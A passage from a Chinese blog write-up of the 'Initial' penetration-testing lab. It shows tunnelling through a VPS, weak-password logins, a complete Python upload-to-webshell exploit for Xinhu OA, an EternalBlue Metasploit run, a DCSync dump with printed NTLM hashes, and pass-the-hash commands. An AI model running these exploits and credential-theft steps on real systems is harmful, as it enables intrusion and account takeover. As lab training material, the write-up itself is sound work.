+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x linux_x64_agent<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./linux_x64_agent -c &lt;admin的IP&gt;:&lt;admin的端口&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/14/Initial/image-20251113134612672.png" srcset="/img/loading.gif" lazyload alt="image-20251113134612672"></p>
+<p>在vps上看到多出<code>(admin) &gt;&gt;</code>，这就是成功连上了</p>
+<p><img src="/2025/11/14/Initial/image-20251113134640098.png" srcset="/img/loading.gif" lazyload alt="image-20251113134640098"></p>
+<p>然后输入<code>help</code>或者<code>h</code>就可以查看命令</p>
+<p><img src="/2025/11/14/Initial/image-20251113134733105.png" srcset="/img/loading.gif" lazyload alt="image-20251113134733105"></p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>help</td>
+<td>显示帮助信息、命令</td>
+</tr>
+<tr>
+<td>detail</td>
+<td>显示已连接节点的信息</td>
+</tr>
+<tr>
+<td>topo</td>
+<td>显示节点的拓扑结构，直观了解各节点间的连接关系、布局等情况</td>
+</tr>
+<tr>
+<td>use <id></td>
+<td>用来选择用户想要使用的目标节点</td>
+</tr>
+<tr>
+<td>exit</td>
+<td>用于退出程序</td>
+</tr>
+</tbody></table>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">detail<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/14/Initial/image-20251113134902738.png" srcset="/img/loading.gif" lazyload alt="image-20251113134902738"></p>
+<p>这里<code>detail</code>展示连接节点的信息，然后使用命令<code>use 0</code>选择连这个主机，可以一次连接多个，如果有多个就<code>use &lt;id&gt;</code>，<code>id</code>就是前面的<code>Node[id]</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use 0<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/14/Initial/image-20251113134936609.png" srcset="/img/loading.gif" lazyload alt="image-20251113134936609"></p>
+<p>然后开一个<code>socks</code>进行流量转发</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">socks 15000<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/14/Initial/image-20251113135041909.png" srcset="/img/loading.gif" lazyload alt="image-20251113135041909"></p>
+<p>像上面图这样就是开成功了，然后是想要在自己本机上执行命令打到内网有三种方式，这里使用Proxifier，其他的在另一个博客中有写</p>
+<p>配置：打开配置文件中的代理服务器</p>
+<p><img src="/2025/11/14/Initial/image-20251113184758566.png" srcset="/img/loading.gif" lazyload alt="image-20251113184758566"></p>
+<p>添加一个代理服务器，写入vps的 IP 和流量转发到的端口，使用SOCK Version 5</p>
+<p><img src="/2025/11/14/Initial/image-20251113184848223.png" srcset="/img/loading.gif" lazyload alt="image-20251113184848223"></p>
+<p>然后是第二个代理规则</p>
+<p><img src="/2025/11/14/Initial/image-20251113184924951.png" srcset="/img/loading.gif" lazyload alt="image-20251113184924951"></p>
+<p>选择刚才配置的</p>
+<p><img src="/2025/11/14/Initial/image-20251113185004898.png" srcset="/img/loading.gif" lazyload alt="image-20251113185004898"></p>
+<p>就可以直接在本机访问到内网服务了</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.22.1.18/</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/14/Initial/image-20251113185047887.png" srcset="/img/loading.gif" lazyload alt="image-20251113185047887"></p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>先扫一下目录</p>
+<p><img src="/2025/11/14/Initial/image-20251113190140025.png" srcset="/img/loading.gif" lazyload alt="image-20251113190140025"></p>
+<p>扫到了<code>phpmyadmin</code>，弱口令爆破出admin的密码是<code>admin123</code>，成功登录后台</p>
+<p><img src="/2025/11/14/Initial/image-20251113142209466.png" srcset="/img/loading.gif" lazyload alt="image-20251113142209466"></p>
+<p>访问<code>http://172.22.1.18/phpmyadmin</code>，也是弱口令登录，用户名和密码都是<code>root</code>，成功登录后台</p>
+<p><img src="/2025/11/14/Initial/image-20251113142429682.png" srcset="/img/loading.gif" lazyload alt="image-20251113142429682"></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Error1s/p/16869854.html">https://www.cnblogs.com/Error1s/p/16869854.html</a></p>
+<p>信呼OA有个文件上传漏洞，直接打POC</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br> <br>session = requests.session()<br> <br>url_pre = <span class="hljs-string">&#x27;http://172.22.1.18/&#x27;</span><br>url1 = url_pre + <span class="hljs-string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span><br>url2 = url_pre + <span class="hljs-string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span><br>url3 = url_pre + <span class="hljs-string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span><br> <br>data1 = &#123;<br>    <span class="hljs-string">&#x27;rempass&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;jmpass&#x27;</span>: <span class="hljs-string">&#x27;false&#x27;</span>,<br>    <span class="hljs-string">&#x27;device&#x27;</span>: <span class="hljs-string">&#x27;1625884034525&#x27;</span>,<br>    <span class="hljs-string">&#x27;ltype&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;adminuser&#x27;</span>: <span class="hljs-string">&#x27;dGVzdA::&#x27;</span>,<br>    <span class="hljs-string">&#x27;adminpass&#x27;</span>: <span class="hljs-string">&#x27;YWJjMTIz&#x27;</span>,<br>    <span class="hljs-string">&#x27;yanzm&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span><br>&#125;<br> <br> <br>r = session.post(url1, data=data1)<br>r = session.post(url2, files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.php&#x27;</span>, <span class="hljs-string">&#x27;r+&#x27;</span>)&#125;)<br> <br>filepath = <span class="hljs-built_in">str</span>(r.json()[<span class="hljs-string">&#x27;filepath&#x27;</span>])<br>filepath = <span class="hljs-string">&quot;/&quot;</span> + filepath.split(<span class="hljs-string">&#x27;.uptemp&#x27;</span>)[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;.php&#x27;</span><br><span class="hljs-built_in">id</span> = r.json()[<span class="hljs-string">&#x27;id&#x27;</span>]<br> <br>url3 = url_pre + <span class="hljs-string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span>&#x27;</span><br> <br>r = session.get(url3)<br></code></pre></td></tr></table></figure>
+
+<p>同目录下要新建一个<code>1.php</code>文件，写入一句话木马</p>
+<p><img src="/2025/11/14/Initial/image-20251113191050946.png" srcset="/img/loading.gif" lazyload alt="image-20251113191050946"></p>
+<p>直接运行脚本得到</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">&lt;<span class="hljs-keyword">br</span> /&gt;<br><span class="hljs-symbol">&lt;b&gt;</span>Notice&lt;/<span class="hljs-keyword">b</span>&gt;:  Undefined <span class="hljs-built_in">index</span>: <span class="hljs-keyword">shell</span> in <span class="hljs-symbol">&lt;b&gt;</span>C:\phpStudy\PHPTutorial\WWW\upload\<span class="hljs-number">2025</span>-<span class="hljs-number">11</span>\<span class="hljs-number">13</span>_19110039.php&lt;/<span class="hljs-keyword">b</span>&gt; <span class="hljs-keyword">on</span> <span class="hljs-built_in">line</span> <span class="hljs-symbol">&lt;b&gt;</span><span class="hljs-number">1</span>&lt;/<span class="hljs-keyword">b</span>&gt;&lt;<span class="hljs-keyword">br</span> /&gt;<br><br>/upload/<span class="hljs-number">2025</span>-<span class="hljs-number">11</span>/<span class="hljs-number">13</span>_19110039.php<br></code></pre></td></tr></table></figure>
+
+<p>直接蚁剑连接</p>
+<p><img src="/2025/11/14/Initial/image-20251113191200113.png" srcset="/img/loading.gif" lazyload alt="image-20251113191200113"></p>
+<p>进入到<code>C:\Users\Administrator\flag</code>，然后用<code>type</code>命令读<code>flag02.txt</code></p>
+<p><img src="/2025/11/14/Initial/image-20251113191553614.png" srcset="/img/loading.gif" lazyload alt="image-20251113191553614"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2ce3</span>-<span class="hljs-number">4813</span>-<span class="hljs-number">87</span>d4-<br></code></pre></td></tr></table></figure>
+
+<h1 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h1><h2 id="设置kali代理"><a href="#设置kali代理" class="headerlink" title="设置kali代理"></a>设置kali代理</h2><p>然后打<code>172.22.1.21</code>的永恒之蓝，打之前先kali设置<code>socks5</code>代理</p>
+<p>找到<code>/etc/proxychains4.conf</code>，写入：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">socks5</span> <span class="hljs-number">47.122.75.126</span> <span class="hljs-number">15000</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/14/Initial/image-20251113230904950.png" srcset="/img/loading.gif" lazyload alt="image-20251113230904950"></p>
+<h2 id="msf打永恒之蓝"><a href="#msf打永恒之蓝" class="headerlink" title="msf打永恒之蓝"></a>msf打永恒之蓝</h2><p>利用msf打永恒之蓝，由于目标主机可能不出网，需要设置正向连接的payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 msfconsole<br>use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid<br><span class="hljs-built_in">set</span> RHOSTS 172.22.1.21<br>exploit<br></code></pre></td></tr></table></figure>
+
+<p>成功正向连接，获取到 SYSTEM 权限</p>
+<p><img src="/2025/11/14/Initial/image-20251113233611248.png" srcset="/img/loading.gif" lazyload alt="image-20251113233611248"></p>
+<h2 id="DCSync攻击"><a href="#DCSync攻击" class="headerlink" title="DCSync攻击"></a>DCSync攻击</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11561">https://xz.aliyun.com/news/11561</a></p>
+<p><strong>DCSync攻击:</strong><br>DCSync的原理是利用域控制器之间的数据同步复制<br>DCSync是AD域渗透中常用的凭据窃取手段，默认情况下，域内不同DC每隔15分钟会进行一次数据同步，当一个DC从另外一个DC同步数据时，发起请求的一方会通过目录复制协议（MS-  DRSR）来对另外一台域控中的域用户密码进行复制，DCSync就是利用这个原理，“模拟”DC向真实DC发送数据同步请求，获取用户凭据数据，由于这种攻击利用了Windows RPC协议，并不需要登陆域控或者在域控上落地文件，避免触发EDR告警，因此DCSync时一种非常隐蔽的凭据窃取方式<br><strong>DCSync 攻击前提:</strong><br>想进行DCSync 攻击，必须获得以下任一用户的权限：</p>
+<ul>
+<li>Administrators 组内的用户</li>
+<li>Domain Admins 组内的用户</li>
+<li>Enterprise Admins 组内的用户域控制器的计算机帐户</li>
+</ul>
+<p>即：默认情况下域管理员组具有该权限</p>
+</blockquote>
+<p>此时是 SYSTEM 权限，满足 DCSync 攻击条件</p>
+<p>加载 kiwi 模块（Mimikatz 的增强版），可以用来抓取系统内的各种凭据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">load kiwi<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/14/Initial/image-20251113235605285.png" srcset="/img/loading.gif" lazyload alt="image-20251113235605285"></p>
+<p>查看域名信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systeminfo | findstr /C:<span class="hljs-string">&quot;域&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/14/Initial/image-20251114000415936.png" srcset="/img/loading.gif" lazyload alt="image-20251114000415936"></p>
+<p>得到<code>xiaorang.lab</code></p>
+<p>从DC（域控制器）中导出所有用户的凭据信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/14/Initial/image-20251114000558191.png" srcset="/img/loading.gif" lazyload alt="image-20251114000558191"></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">meterpreter &gt; kiwi_cmd lsadump::dcsync /domain:xiaorang<span class="hljs-selector-class">.lab</span> /<span class="hljs-attribute">all</span> /csv<br><span class="hljs-selector-attr">[proxychains]</span> DLL init: proxychains-ng <span class="hljs-number">4.17</span><br><span class="hljs-selector-attr">[proxychains]</span> DLL init: proxychains-ng <span class="hljs-number">4.17</span><br><span class="hljs-selector-attr">[DC]</span> <span class="hljs-string">&#x27;xiaorang.lab&#x27;</span> will be the domain<br><span class="hljs-selector-attr">[DC]</span> <span class="hljs-string">&#x27;DC01.xiaorang.lab&#x27;</span> will be the DC server<br><span class="hljs-selector-attr">[DC]</span> Exporting domain <span class="hljs-string">&#x27;xiaorang.lab&#x27;</span><br><span class="hljs-selector-attr">[rpc]</span> Service  : ldap<br><span class="hljs-selector-attr">[rpc]</span> AuthnSvc : GSS_NEGOTIATE (<span class="hljs-number">9</span>)<br><span class="hljs-number">502</span>     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        <span class="hljs-number">514</span><br><span class="hljs-number">1106</span>    Marcus  e07510a4284b3c97c8e7dee970918c5c        <span class="hljs-number">512</span><br><span class="hljs-number">1107</span>    Charles f6a9881cd5ae709abb4ac9ab87f24617        <span class="hljs-number">512</span><br><span class="hljs-number">1000</span>    DC01$   <span class="hljs-number">2</span>cf8d85eefd7220ca84a1edf5ad927bb        <span class="hljs-number">532480</span><br><span class="hljs-number">500</span>     Administrator   <span class="hljs-number">10</span>cf89a850fb1cdbe6bb432b859164c8        <span class="hljs-number">512</span><br><span class="hljs-number">1104</span>    XIAORANG-OA01$  a2bfc26aa025568fbd8c49d64aff65d4        <span class="hljs-number">4096</span><br><span class="hljs-number">1108</span>    XIAORANG-WIN7$  <span class="hljs-number">5</span>f193dc784fcfbe1e5182f86fb274096        <span class="hljs-number">4096</span><br></code></pre></td></tr></table></figure>
+
+<p>得到了<code>Administrator</code>的哈希：<code>10cf89a850fb1cdbe6bb432b859164c8</code></p>
+<h2 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h2><p>利用<code>crackmapexec</code>进行哈希传递攻击，以<code>Administrator</code>的身份执行命令</p>
+<p>先查找flag位置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x <span class="hljs-string">&quot;find / -type f -name &quot;</span>*flag*<span class="hljs-string">&quot; 2&gt;/dev/null&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/14/Initial/image-20251114001806902.png" srcset="/img/loading.gif" lazyload alt="image-20251114001806902"></p>
+<p>读flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x <span class="hljs-string">&quot;type Users\Administrator\flag\flag03.txt&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/14/Initial/image-20251114001902330.png" srcset="/img/loading.gif" lazyload alt="image-20251114001902330"></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">e8f<span class="hljs-number">88d0d43d6</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">flag&#123;<span class="hljs-number">60b53231</span>-2ce3-<span class="hljs-number">4813</span>-87d4-e8f88d0d43d6&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>参考文章</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11561">https://xz.aliyun.com/news/11561</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/uuzeray/article/details/141316323">https://blog.csdn.net/uuzeray/article/details/141316323</a></p>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" class="category-chain-item">春秋云镜</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="print-no-link">#内网渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Initial</div>
+      <div>https://yschen20.github.io/2025/11/14/Initial/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Suzen</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年11月14日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年11月14日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/11/12/0xGame2025-WEB-WP/" title="0xGame2025-WEB-WP">
+                        <span class="hidden-mobile">0xGame2025-WEB-WP</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"https://imagegoo-twikoo.hf.space","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              Fluid.utils.listenDOMLoaded(function() {
+                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+                Fluid.plugins.imageCaption(imgSelector);
+                Fluid.plugins.fancyBox(imgSelector);
+              });
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+    <div>
+        <span id="timeDate">正在载入天数...</span>
+        <span id="times">载入时分秒...</span>
+        <script>
+          var now = new Date();
+          function createtime(){
+            var grt= new Date("04/25/2025 00:00:00");
+            now.setTime(now.getTime()+250);
+            days = (now - grt ) / 1000 / 60 / 60 / 24;
+            dnum = Math.floor(days);
+            hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+            hnum = Math.floor(hours);
+            if(String(hnum).length ==1 ){
+              hnum = "0" + hnum;
+            }
+            minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+            mnum = Math.floor(minutes);
+            if(String(mnum).length ==1 ){
+              mnum = "0" + mnum;
+            }
+            seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+            snum = Math.round(seconds);
+            if(String(snum).length ==1 ){
+              snum = "0" + snum;
+            }
+            document.getElementById("timeDate").innerHTML = "🚀已持续航行&nbsp"+dnum+"&nbsp天";
+            document.getElementById("times").innerHTML = hnum + "&nbsp时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
+          }
+          setInterval("createtime()",250);
+        </script>
+    </div>
+
+
+
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  var relativeDate = function() {
+    var updatedTime = document.getElementById('updated-time');
+    if (updatedTime) {
+      var text = updatedTime.textContent;
+      var reg = /\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:Z|[+-]\d{2}:\d{2})/;
+      var matchs = text.match(reg);
+      if (matchs) {
+        var relativeTime = moment(matchs[0]).fromNow();
+        updatedTime.textContent = text.replace(reg, relativeTime);
+      }
+      updatedTime.style.display = '';
+    }
+  };
+  Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/moment.min.js', function() {
+    if (!'zh-cn'.startsWith('en')) {
+      Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/locale/zh-cn.min.js', function() {
+        relativeDate();
+      });
+    } else {
+      relativeDate();
+    }
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
